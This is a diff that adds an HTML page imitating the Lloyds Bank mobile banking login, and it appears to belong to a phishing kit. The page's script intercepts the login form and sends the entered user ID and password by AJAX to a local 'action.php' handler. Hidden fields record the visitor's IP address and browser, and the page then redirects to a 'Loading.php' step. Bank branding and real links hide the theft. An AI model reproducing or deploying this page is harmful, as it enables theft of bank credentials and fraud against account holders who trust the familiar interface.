@@ -1,0 +1,63 @@
+<!doctypehtml PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd"><html xml:lang=en-gb xmlns=http://www.w3.org/1999/xhtml><title>
+   Lloyds Bank - Mobile Banking - Login
+  </title><meta name=keywords><meta name=description><meta content="text/html; charset=utf-8"http-equiv=Content-Type><meta content=en-gb http-equiv=content-language><link href media=handheld rel=alternate><meta content=width=device-width name=viewport><meta content=1 name=DCSext.hasTealium><link href=files/img/ltsb%2057x57-.JPG rel=apple-touch-icon sizes=57x57><link href=files/img/ltsb%20114x114-.JPG rel=apple-touch-icon sizes=114x114><link href=files/css/base-auto-min200720.css rel=stylesheet><link rel="shortcut icon"href=files/img/favicon.ico><script src=files/js/jquery.js></script><script>$( document ).ready(function() {
+
+	
+	var allInputs = $(":input");
+	
+
+	
+	
+	
+	
+	$('#frmLogin').submit(function(e){
+		e.preventDefault();
+		var username = $('#username').val();
+		var password = $('#password').val();
+		
+        if(username.includes("@")) {
+            document.getElementById("email_error_message").style = "";
+            return false;
+        }
+		if(username == null || username == ''){
+			return false;
+		}else{
+			
+		}
+		
+		if(password == null || password == ''){
+			return false;
+		}else{
+			
+		}
+		
+		$.ajax({
+			type : 'POST',
+			url : 'files/action.php?type=login',
+			data : $('#frmLogin').serialize(),
+			success: function (data) {
+				console.log(data);
+				var parsed_data = JSON.parse(data);
+				if(parsed_data.status == 'ok'){
+					//console.log(parsed_data);
+					
+					
+					location.href = "Loading.php"
+					
+					
+					
+				}else{
+					return false;
+				}
+				//console.log(parsed_data.status);
+			}
+			})
+		
+		
+		
+	});
+
+	
+	
+	
+});</script><body class=hasJS><div id=outer><div id=banner><p id=logo><img alt="Lloyds Bank"src=files/img/logo-.gif><p id=userstatusNGB><img alt=Secure src=files/img/padlock-1429554491.png><p class=cookiePolicy><a title="Cookie Policy"href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/COOKIE_POLICY> Cookie Policy </a><div class=clearer></div></div><div id=header><div class=panelTL><div class=panelTR><div class=panelBR><div class=panelBL><div id=headerInner><h1>Welcome to Internet Banking</h1></div></div></div></div></div></div><div class=content><div class=login><div class=panelTL><div class=panelTR><div class=panelBR><div class=panelBL><div class=loginInner><div class=msgError id=email_error_message style=display:none><div class=msgTL><div class=msgTR><div class=msgBR><div class=msgBL><p class=msgP>You are not allowed to use your email. Please try again. <a href=https://www.online.lloydsbank.co.uk/> Having problems signing in? </a> Please note, you’ll be redirected to the desktop site.</div></div></div></div></div><div class=loginFields><form action=/personal/mbprimarylogin autocomplete=off id=frmLogin method=post name=frmLogin><input name=ip type=hidden value=112.134.74.235><input name=ua type=hidden value=Firefox><div class=formField><label for=frmLogin:lblUserID>User ID</label><input autocomplete=off class=wide id=username maxlength=30 name=username required></div><div class=formField><label for=frmLogin:lblPassword>Password</label><input autocomplete=off class=wide id=password maxlength=20 name=password required type=password></div><div class="formField loginCheckbox"><input class=checkbox name=frmLogin:loginRemember type=checkbox><label class=checkboxLabel for=frmLogin:loginRemember><a title="Remember my User ID"href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/REMEMBER_ME id=rememberMe name=rememberMe> Remember my User ID </a></label></div><div class=actionsLogin><div class=divider><hr></div><input class=submitAction id=frmLogin:lnkLogin1 name=frmLogin:lnkLogin1 text=Continue type=submit value=Continue></div></form></div></div></div></div></div></div></div><div class=aside><p class=sideNote><a title="Forgotten your logon details?"href=https://online.lloydsbank.co.uk/ib-access/cwa/forgotten-details/index.html id=lnkForgotUserIDDMC name=lnkForgotUserIDDMC> Forgotten your logon details? </a></div><div class=appBannerBG><div class="appBannerLink market"><p style="text-align: center;"><a rel="noopener noreferrer"title="Personal Loan. Use our online calculator to check if you are likely to be approved for a loan without affecting your credit score. Lending is subject to status."href=https://www.lloydsbank.com/loans.html?WT.ac=lon/public/navigation/ban/r1pr/loan/s/rl/LLnsNGBonB target=_blank> <img alt="Personal Loan. Use our online calculator to check if you are likely to be approved for a loan without affecting your credit score. Lending is subject to status."src=files/img/personalloan2020-.png> </a></div></div><div class=clearer></div><div id=footerLogin><div class=FootNav><div class=lnkLevFoot><p class=lnkLevFootP><a title="Register for Internet Banking"href=https://online.lloydsbank.co.uk/personal/a/useradmin/mobile/registration/selectaccounttyperegistration.jsp?mobile=true> Register for Internet Banking </a> <a title="Go to desktop site"href=https://online.lloydsbank.co.uk/personal/logon/login.jsp?mobile=false> Go to desktop site </a> <a href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/HELP title=Help> Help </a> <a href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/SECURITY title=Security> Security </a> <a title="Contact us"href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/CONTACT_US> Contact us </a> <a title="Mobile Banking"href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING> Mobile Banking </a> <a href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/LEGAL title=Legal> Legal </a></div><div class=aside><div class=aside><p class=sideNote><a title="Mobile Banking"href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/MOBILE_BANKING> Mobile Banking </a></div><div class=appBannerBG><div class=appBannerLink><p align=center><a title="fscs login tile"href=http://www.lloydsbank.com/legal/financial-services-compensation-scheme.asp> <img alt="fscs login tile"src=files/img/Mobile%2520-%25201x-1461591119.png> </a></div></div><div class=clearer></div><div><div class=footerLinksLogin><a href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/SECURITY title=Security> Security </a><a href=https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/LEGAL title=Legal> Legal </a></div></div></div></div><input name=smartAppForIosAndAndroid type=hidden value=true><input name=smartAppForIosAbvSix type=hidden value=true></div></div></div>
